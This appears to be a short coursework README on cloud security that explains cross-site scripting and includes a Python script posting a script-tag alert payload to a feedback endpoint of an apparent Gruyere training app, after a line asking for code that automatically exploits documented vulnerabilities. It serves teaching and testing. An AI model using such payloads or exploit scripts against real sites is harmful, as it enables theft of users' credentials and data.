# Cloud-Security-2023
create code that can automatically exploit its documented vulnerabilities.

**XSS Attack**-harmful because they can be used to steal sensitive information, like login credentials or personal data from users.
How to execute an XSS attack- the payload variable contains a script tag with malicious JavaScript code. Problem arises if the server doesn't correctly/properly sanitize or encode the feedback parameter when rendering it in an HTML response. Consequence- script modified on the client side (XSS attack)

**Python Code for Cross-Site Scripting**

import requests  
payload = "<script>alert('XSS Attack!');</script>" #Payload variable mentioned above- site of vulnerability 
document_id = "your-document-id"
url = f"http://gruyere-app.com/feedback?id={document_id}" #This is the target website whereby the document ID has been appended to reach specific endpoint
data = {"feedback": payload}  #key-value pair received by the server where the data is processed(ie value which the payload variable is processed)
response = requests.post(url, data=data)
print(response.text)
